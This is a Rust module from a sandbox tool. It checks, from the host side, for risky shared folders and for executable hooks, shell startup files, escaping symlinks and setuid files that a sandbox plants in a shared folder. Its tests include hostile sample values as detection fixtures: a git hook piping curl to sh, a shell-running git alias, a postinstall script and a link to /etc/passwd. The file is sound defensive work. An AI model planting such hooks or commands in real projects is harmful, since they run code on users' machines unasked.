//! Suspicious things osh can see from the host side, so it does not have to trust the sandbox:
//! a risky folder picked for sharing, and files that appear or change in a read-write shared
//! folder and would run on the host the next time a tool opens that folder (git hooks, direnv,
//! make, npm scripts, editor tasks, shell startup files), symlinks that leave the folder, and
//! setuid files. Pure functions plus one polling thread; `app.rs` shows the results.
use std::{
    collections::{hash_map::DefaultHasher, BTreeMap},
    fs,
    hash::{Hash, Hasher},
    os::unix::fs::MetadataExt,
    path::{Component, Path, PathBuf},
    sync::mpsc::Sender,
    time::Duration,
};

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Severity {
    Warn,
    High,
}

#[derive(Clone, PartialEq, Eq, Debug)]
pub struct Alert {
    pub sev: Severity,
    pub title: String,
    pub detail: String,
}

/// Folders under `$HOME` that hold secrets or tool configuration the host trusts.
const SECRET_DIRS: &[&str] = &[
    ".ssh", ".aws", ".gnupg", ".config", ".kube", ".docker", ".azure", ".local", ".claude",
    "Library",
];

/// Why sharing `path` with a sandbox is risky, or `None` when it looks like an ordinary project.
pub fn risky_share(path: &str, home: &str) -> Option<String> {
    let p = path.trim_end_matches('/');
    let h = home.trim_end_matches('/');
    if p.is_empty() {
        return Some(
            "it is the whole disk: every file of yours would be visible to the sandbox".into(),
        );
    }
    if p == h {
        return Some(
            "it is your home folder: keys, tokens and shell startup files live there".into(),
        );
    }
    if !h.is_empty() && h.starts_with(&format!("{p}/")) {
        return Some(format!("it contains your home folder ({h})"));
    }
    if let Some(rest) = p.strip_prefix(&format!("{h}/")) {
        let top = rest.split('/').next().unwrap_or("");
        if SECRET_DIRS.contains(&top) {
            return Some(format!(
                "{top} holds credentials or settings the host trusts"
            ));
        }
    }
    for sys in [
        "/etc", "/var", "/usr", "/root", "/bin", "/sbin", "/System", "/private",
    ] {
        if p == sys || p.starts_with(&format!("{sys}/")) {
            return Some(format!("{sys} is a system folder"));
        }
    }
    None
}

/// `git config` keys that make git run a program, as `key = value` lines.
pub fn git_config_flags(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut section = String::new();
    for raw in text.lines() {
        let l = raw.trim();
        if let Some(s) = l.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
            section = s.trim().to_lowercase();
            continue;
        }
        let Some((k, v)) = l.split_once('=') else {
            continue;
        };
        let (k, v) = (k.trim().to_lowercase(), v.trim());
        let sec = section.split_whitespace().next().unwrap_or("");
        let flagged = match (sec, k.as_str()) {
            ("core", "fsmonitor" | "hookspath" | "sshcommand" | "editor" | "pager" | "askpass") => {
                true
            }
            ("credential", "helper") => true,
            ("diff", "external") | ("sequence", "editor") | ("gpg", "program") => true,
            ("alias", _) => v.starts_with('!'),
            ("filter", "clean" | "smudge" | "process") => true,
            ("include" | "includeif", "path") => true,
            ("protocol", "allow") => v == "always",
            _ => false,
        };
        if flagged {
            out.push(format!("[{section}] {k} = {v}"));
        }
    }
    out
}

/// The lifecycle scripts of a `package.json`, as one comparable string.
fn package_scripts(text: &str) -> String {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(text) else {
        return String::new();
    };
    v.get("scripts").map(|s| s.to_string()).unwrap_or_default()
}

/// Files whose content runs on the host when a tool opens the folder: (path, what runs it).
const WATCHED: &[(&str, &str, Severity)] = &[
    (
        ".envrc",
        "direnv runs it when you enter the folder",
        Severity::High,
    ),
    (
        ".git/config",
        "git runs programs named in it",
        Severity::High,
    ),
    (
        ".git/info/attributes",
        "git filters named here run programs",
        Severity::High,
    ),
    (
        ".gitattributes",
        "git filters named here run programs",
        Severity::Warn,
    ),
    (
        ".vscode/tasks.json",
        "VS Code can run its tasks when the folder opens",
        Severity::Warn,
    ),
    (
        ".vscode/settings.json",
        "VS Code settings can point at programs to run",
        Severity::Warn,
    ),
    (
        ".devcontainer/devcontainer.json",
        "dev container commands run when it opens",
        Severity::Warn,
    ),
    ("Makefile", "make runs it", Severity::Warn),
    ("makefile", "make runs it", Severity::Warn),
    ("justfile", "just runs it", Severity::Warn),
    (".justfile", "just runs it", Severity::Warn),
    (
        "package.json",
        "npm runs its lifecycle scripts",
        Severity::Warn,
    ),
    (
        ".npmrc",
        "npm can name programs and registries in it",
        Severity::Warn,
    ),
    (
        ".pre-commit-config.yaml",
        "pre-commit runs its hooks on commit",
        Severity::Warn,
    ),
    ("build.rs", "cargo runs it at build", Severity::Warn),
    (".bashrc", "your shell runs it at start", Severity::High),
    (".zshrc", "your shell runs it at start", Severity::High),
    (".zshenv", "your shell runs it at start", Severity::High),
    (".zprofile", "your shell runs it at start", Severity::High),
    (".profile", "your shell runs it at start", Severity::High),
    (
        ".bash_profile",
        "your shell runs it at start",
        Severity::High,
    ),
];

/// Folders whose every file runs: (path, what runs them).
const WATCHED_DIRS: &[(&str, &str)] = &[
    (
        ".git/hooks",
        "git runs these on commit, checkout, push and more",
    ),
    (".husky", "husky runs these as git hooks"),
];

/// What a scan keeps for each interesting path: a fingerprint, plus the reason shown on change.
pub type Scan = BTreeMap<String, (String, String, Severity)>;

fn hash_bytes(b: &[u8]) -> String {
    let mut h = DefaultHasher::new();
    b.hash(&mut h);
    format!("{:016x}", h.finish())
}

fn read_small(p: &Path) -> Option<Vec<u8>> {
    let md = fs::metadata(p).ok()?;
    (md.is_file() && md.len() <= 2_000_000).then_some(())?;
    fs::read(p).ok()
}

/// A lexical `..`/`.` collapse; links are judged by where they point, not by whether it exists.
fn normalize(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            c => out.push(c.as_os_str()),
        }
    }
    out
}

/// Fingerprints of everything in `root` that would run on the host or reach outside it.
pub fn scan(root: &Path) -> Scan {
    let mut out = Scan::new();
    for (rel, why, sev) in WATCHED {
        let p = root.join(rel);
        let Some(bytes) = read_small(&p) else {
            continue;
        };
        let text = String::from_utf8_lossy(&bytes);
        let (fp, why) = match *rel {
            ".git/config" => {
                let flags = git_config_flags(&text);
                if flags.is_empty() {
                    continue;
                }
                (
                    hash_bytes(flags.join("\n").as_bytes()),
                    format!("{why}: {}", flags.join("; ")),
                )
            }
            "package.json" => {
                let s = package_scripts(&text);
                if s.is_empty() {
                    continue;
                }
                (hash_bytes(s.as_bytes()), (*why).to_string())
            }
            _ => (hash_bytes(&bytes), (*why).to_string()),
        };
        out.insert((*rel).to_string(), (fp, why, *sev));
    }
    for (dir, why) in WATCHED_DIRS {
        let Ok(rd) = fs::read_dir(root.join(dir)) else {
            continue;
        };
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().to_string();
            if name.ends_with(".sample") {
                continue;
            }
            if let Some(bytes) = read_small(&e.path()) {
                out.insert(
                    format!("{dir}/{name}"),
                    (hash_bytes(&bytes), (*why).to_string(), Severity::High),
                );
            }
        }
    }
    walk(root, root, 0, &mut 0, &mut out);
    out
}

const SKIP_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    ".venv",
    "vendor",
    ".cache",
];

/// Symlinks that leave `root` and setuid/setgid files, to a bounded depth and size.
fn walk(root: &Path, dir: &Path, depth: usize, seen: &mut usize, out: &mut Scan) {
    if depth > 4 {
        return;
    }
    let Ok(rd) = fs::read_dir(dir) else { return };
    for e in rd.flatten() {
        *seen += 1;
        if *seen > 20_000 {
            return;
        }
        let p = e.path();
        let Ok(md) = fs::symlink_metadata(&p) else {
            continue;
        };
        let rel = p
            .strip_prefix(root)
            .unwrap_or(&p)
            .to_string_lossy()
            .to_string();
        if md.file_type().is_symlink() {
            let Ok(t) = fs::read_link(&p) else { continue };
            let abs = if t.is_absolute() {
                normalize(&t)
            } else {
                normalize(&p.parent().unwrap_or(root).join(&t))
            };
            if !abs.starts_with(normalize(root)) {
                out.insert(
                    format!("link:{rel}"),
                    (
                        t.to_string_lossy().to_string(),
                        format!(
                            "a link to {}, outside the shared folder; host tools follow it",
                            t.display()
                        ),
                        Severity::High,
                    ),
                );
            }
        } else if md.is_file() && md.mode() & 0o6000 != 0 {
            out.insert(
                format!("suid:{rel}"),
                (
                    format!("{:o}", md.mode() & 0o7777),
                    "a setuid or setgid file: it runs with its owner's rights if run on the host"
                        .into(),
                    Severity::High,
                ),
            );
        } else if md.is_dir() {
            let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if !SKIP_DIRS.contains(&name) {
                walk(root, &p, depth + 1, seen, out);
            }
        }
    }
}

/// Alerts for what is new or different in `new` compared with `old`. `folder` names the share.
pub fn diff(folder: &str, old: &Scan, new: &Scan) -> Vec<Alert> {
    new.iter()
        .filter(|(k, (fp, _, _))| old.get(*k).is_none_or(|(o, _, _)| o != fp))
        .map(|(k, (_, why, sev))| {
            let verb = if old.contains_key(k) { "changed" } else { "appeared" };
            let path = k.split_once(':').map_or(k.as_str(), |(_, r)| r);
            Alert {
                sev: *sev,
                title: format!("{path} {verb} in {folder}"),
                detail: format!(
                    "{why}. Look at it before you run git, make, npm or open an editor in {folder} on this machine (git diff, cat {path})."
                ),
            }
        })
        .collect()
}

/// The shared read-write folders osh recorded, one path per entry.
const REGISTRY: &str = "rw-shares.json";

pub fn rw_shares(data: &Path) -> Vec<String> {
    fs::read_to_string(data.join(REGISTRY))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

/// Remember `path` as a folder to watch; a repeat adds nothing.
pub fn register_rw_share(data: &Path, path: &str) -> std::io::Result<()> {
    let mut all = rw_shares(data);
    if all.iter().any(|p| p == path) {
        return Ok(());
    }
    all.push(path.to_string());
    fs::write(
        data.join(REGISTRY),
        serde_json::to_string(&all).unwrap_or_default(),
    )
}

/// Polls every read-write share every `every`; the first scan of a folder is its baseline and
/// raises nothing. Ends when the receiver is gone.
pub fn spawn_watch(data: PathBuf, tx: Sender<Alert>, every: Duration) {
    std::thread::spawn(move || {
        let mut base: BTreeMap<String, Scan> = BTreeMap::new();
        loop {
            for path in rw_shares(&data) {
                let root = Path::new(&path);
                if !root.is_dir() {
                    continue;
                }
                let now = scan(root);
                if let Some(old) = base.get(&path) {
                    let folder = root.file_name().and_then(|n| n.to_str()).unwrap_or(&path);
                    for a in diff(folder, old, &now) {
                        if tx.send(a).is_err() {
                            return;
                        }
                    }
                }
                base.insert(path, now);
            }
            std::thread::sleep(every);
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::symlink;

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("osh-alerts-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn risky_shares_are_named_and_projects_are_not() {
        let home = "/Users/me";
        assert!(risky_share("/", home).unwrap().contains("whole disk"));
        assert!(risky_share("/Users/me", home).unwrap().contains("home"));
        assert!(risky_share("/Users/me/", home).is_some(), "trailing slash");
        assert!(risky_share("/Users", home)
            .unwrap()
            .contains("contains your home"));
        assert!(risky_share("/Users/me/.ssh", home)
            .unwrap()
            .contains(".ssh"));
        assert!(risky_share("/Users/me/.aws/cli", home).is_some());
        assert!(risky_share("/etc/ssh", home).unwrap().contains("system"));
        assert!(risky_share("/Users/me/code/app", home).is_none());
        assert!(
            risky_share("/Users/me/.sshfoo", home).is_none(),
            "prefix only"
        );
    }

    #[test]
    fn git_config_flags_only_program_running_keys() {
        let cfg = "[core]\n\tbare = false\n\tfsmonitor = /tmp/x\n[alias]\n\tco = checkout\n\tevil = !sh -c id\n[remote \"origin\"]\n\turl = git@github.com:a/b.git\n[filter \"lfs\"]\n\tsmudge = git-lfs smudge\n";
        let f = git_config_flags(cfg);
        assert_eq!(f.len(), 3, "{f:?}");
        assert!(f.iter().any(|l| l.contains("fsmonitor")));
        assert!(f.iter().any(|l| l.contains("evil")));
        assert!(f.iter().all(|l| !l.contains("checkout")));
        assert!(git_config_flags("[core]\n\tbare = false\n").is_empty());
    }

    #[test]
    fn a_new_git_hook_raises_a_high_alert_and_samples_do_not() {
        let d = tmp("hook");
        fs::create_dir_all(d.join(".git/hooks")).unwrap();
        fs::write(d.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n").unwrap();
        let base = scan(&d);
        assert!(base.is_empty(), "{base:?}");
        fs::write(d.join(".git/hooks/pre-commit"), "#!/bin/sh\ncurl x|sh\n").unwrap();
        let alerts = diff("app", &base, &scan(&d));
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].sev, Severity::High);
        assert!(alerts[0]
            .title
            .contains(".git/hooks/pre-commit appeared in app"));
        assert!(alerts[0].detail.contains("git diff"));
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn unchanged_files_raise_nothing_and_edits_raise_changed() {
        let d = tmp("edit");
        fs::write(d.join(".envrc"), "export A=1\n").unwrap();
        let a = scan(&d);
        assert!(diff("app", &a, &scan(&d)).is_empty());
        fs::write(d.join(".envrc"), "export A=2\n").unwrap();
        let alerts = diff("app", &a, &scan(&d));
        assert_eq!(alerts.len(), 1);
        assert!(alerts[0].title.contains(".envrc changed"));
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn package_json_only_alerts_on_scripts() {
        let d = tmp("pkg");
        fs::write(
            d.join("package.json"),
            r#"{"name":"a","version":"1","scripts":{"test":"jest"}}"#,
        )
        .unwrap();
        let a = scan(&d);
        fs::write(
            d.join("package.json"),
            r#"{"name":"a","version":"2","scripts":{"test":"jest"}}"#,
        )
        .unwrap();
        assert!(
            diff("app", &a, &scan(&d)).is_empty(),
            "a version bump is not a script change"
        );
        fs::write(
            d.join("package.json"),
            r#"{"name":"a","scripts":{"test":"jest","postinstall":"sh x"}}"#,
        )
        .unwrap();
        assert_eq!(diff("app", &a, &scan(&d)).len(), 1);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn git_config_with_a_program_key_alerts() {
        let d = tmp("gitcfg");
        fs::create_dir_all(d.join(".git")).unwrap();
        fs::write(d.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        let a = scan(&d);
        assert!(a.is_empty());
        fs::write(d.join(".git/config"), "[core]\n\tfsmonitor = /tmp/x\n").unwrap();
        let alerts = diff("app", &a, &scan(&d));
        assert_eq!(alerts.len(), 1);
        assert!(alerts[0].detail.contains("fsmonitor"), "{:?}", alerts[0]);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn links_leaving_the_folder_and_setuid_files_alert_but_inner_links_do_not() {
        let d = tmp("links");
        fs::write(d.join("a.txt"), "x").unwrap();
        symlink("a.txt", d.join("inner")).unwrap();
        assert!(scan(&d).is_empty(), "a link inside the folder is fine");
        symlink("/etc/passwd", d.join("abs")).unwrap();
        symlink("../../outside", d.join("rel")).unwrap();
        let s = scan(&d);
        assert!(
            s.contains_key("link:abs") && s.contains_key("link:rel"),
            "{s:?}"
        );
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(d.join("a.txt"), fs::Permissions::from_mode(0o4755)).unwrap();
        assert!(scan(&d).contains_key("suid:a.txt"));
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn registry_keeps_each_path_once() {
        let d = tmp("reg");
        assert!(rw_shares(&d).is_empty());
        register_rw_share(&d, "/p/app").unwrap();
        register_rw_share(&d, "/p/app").unwrap();
        register_rw_share(&d, "/p/other").unwrap();
        assert_eq!(rw_shares(&d), vec!["/p/app", "/p/other"]);
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn the_watcher_baselines_silently_then_reports_changes() {
        let data = tmp("wdata");
        let share = tmp("wshare");
        register_rw_share(&data, &share.to_string_lossy()).unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        spawn_watch(data.clone(), tx, Duration::from_millis(30));
        std::thread::sleep(Duration::from_millis(200));
        assert!(rx.try_recv().is_err(), "the first scan is the baseline");
        // On a loaded machine the baseline can come after a first write, so keep changing the
        // file until a scan that follows the baseline sees a difference.
        let mut got = None;
        for i in 0..50 {
            fs::write(share.join(".envrc"), format!("evil {i}\n")).unwrap();
            if let Ok(a) = rx.recv_timeout(Duration::from_millis(200)) {
                got = Some(a);
                break;
            }
        }
        let a = got.expect("an alert");
        assert!(a.title.contains(".envrc"), "{a:?}");
        while rx.try_recv().is_ok() {}
        assert!(
            rx.recv_timeout(Duration::from_millis(300)).is_err(),
            "reported once"
        );
        let _ = fs::remove_dir_all(&data);
        let _ = fs::remove_dir_all(&share);
    }
}
